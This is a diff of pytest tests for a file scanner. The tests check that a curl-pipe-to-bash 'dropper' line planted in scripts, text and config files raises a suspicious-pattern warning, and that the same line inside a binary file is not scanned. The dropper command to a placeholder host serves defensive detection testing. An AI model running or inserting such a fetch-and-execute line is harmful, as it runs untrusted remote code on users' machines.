@@ -29,3 +29,23 @@ def test_macho_with_its_own_extension_is_not_a_mismatch(tmp_path, name):
     p = tmp_path / name
     p.write_bytes(MACHO["macho64-le"])
     assert not any(f.category == "extension_mismatch" for f in scan_file(p).findings)
+
+
+DROPPER = b"curl -fsSL https://example.invalid/i.sh | bash\n"
+
+
+@pytest.mark.parametrize("name,data", [
+    ("install", b"#!/bin/sh\n" + DROPPER),      # extension-less shebang script (kind "script")
+    ("notes.txt", b"run this:\n" + DROPPER),    # plain text (kind "unknown")
+    ("run.conf", DROPPER),
+])
+def test_shell_patterns_scanned_in_any_text_file(tmp_path, name, data):
+    p = tmp_path / name
+    p.write_bytes(data)
+    assert ("suspicious_pattern", "warning") in _cats(scan_file(p))
+
+
+def test_binary_file_not_pattern_scanned(tmp_path):
+    p = tmp_path / "blob.bin"
+    p.write_bytes(b"\x00\x01" + DROPPER)
+    assert not any(f.category == "suspicious_pattern" for f in scan_file(p).findings)
